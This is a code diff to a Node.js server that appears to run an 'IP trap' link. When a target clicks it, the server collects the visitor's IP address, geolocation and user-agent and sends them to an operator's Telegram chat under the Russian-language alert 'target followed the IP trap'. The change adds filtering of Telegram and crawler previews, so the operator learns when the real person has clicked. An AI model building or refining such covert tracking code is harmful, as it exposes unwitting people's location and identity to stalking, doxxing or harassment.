@@ -27,8 +27,9 @@ async function startServer() {
     if (Array.isArray(ip)) ip = ip[0];
     if (ip.includes(',')) ip = ip.split(',')[0].trim();
     
-    const ua = req.headers['user-agent'] || "Неизвестно";
-    
+    const ua = (req.headers['user-agent'] || "Неизвестно").toString();
+    const isBot = ua.toLowerCase().includes("telegram") || ua.toLowerCase().includes("bot") || ua.toLowerCase().includes("spider");
+
     // Process tracking logic in background without keeping user waiting
     setImmediate(async () => {
        try {
@@ -42,9 +43,13 @@ async function startServer() {
               }
            }
            
+           let title = isBot 
+             ? "🤖 <b>ПРЕДУПРЕЖДЕНИЕ: Ссылку проверил бот/Telegram!</b>\n<i>(Обычно Telegram автоматически сканирует ссылки для превью. Подождите, пока кликнет сам человек)</i>\n" 
+             : "🚨 <b>ЦЕЛЬ ПЕРЕШЛА ПО IP-ЛОВУШКЕ!</b>\n";
+
            await botAlert.api.sendMessage(
                chatId, 
-               `🚨 <b>Цель перешла по IP-ловушке!</b>\n\n📌 <b>IP адрес:</b> <code>${ip}</code>\n\n${geoinfo}\n\n🕵️ <b>Устройство (User-Agent):</b>\n<code>${ua}</code>`, 
+               `${title}\n📌 <b>IP адрес:</b> <code>${ip}</code>\n\n${geoinfo}\n\n🕵️ <b>Устройство (User-Agent):</b>\n<code>${ua}</code>`, 
                { parse_mode: "HTML" }
            );
        } catch(e) {
